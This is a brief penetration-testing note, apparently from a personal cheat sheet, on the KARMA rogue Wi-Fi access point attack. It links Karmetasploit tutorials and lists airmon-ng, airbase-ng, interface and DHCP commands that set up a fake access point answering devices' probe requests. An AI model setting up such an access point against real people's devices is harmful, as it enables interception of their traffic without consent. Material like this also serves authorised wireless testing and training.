# Karma Atack

KARMA is an attack that exploits a behaviour of some Wi-Fi devices, combined with the lack of access point authentication in numerous WiFi protocols.


## Referencias

[https://www.offensive-security.com/metasploit-unleashed/karmetasploit-configuration/](https://www.offensive-security.com/metasploit-unleashed/karmetasploit-configuration/)
[https://www.offensive-security.com/metasploit-unleashed/karmetasploit-action/](https://www.offensive-security.com/metasploit-unleashed/karmetasploit-action/)
[https://www.offensive-security.com/metasploit-unleashed/karmetasploit-attack-analysis/](https://www.offensive-security.com/metasploit-unleashed/karmetasploit-attack-analysis/)
[http://www.hackplayers.com/2013/07/introduccion-karmetasploit.html](http://www.hackplayers.com/2013/07/introduccion-karmetasploit.html)

## Config

See available wireless network interfaces to use

```airmon-ng```

Config wireless interface in mod monitor

```airmon-ng start wlan0```

### Create a new screen for the Facke AP

Create the new screen

```screen -S fakeAP```

Config the params of the Facke AP

```airbase-ng -P -C 30 -c 6 -e "FakeAPname" mon0 [wlan0mon]```

Deatach from the new screen

```Cntrl a d```

Config the ip of the new interface

```ifconfig at0 up 10.0.0.1 netmask 255.255.255.0```

Create the Database

```touch /var/lib/dhcp/dhcpd.leases```

Start DHCP Server

```dhcpd -cf /etc/dhcp/dhcpd.conf at0```

Check all is okey

```ps aux | grep [d]hcpd```
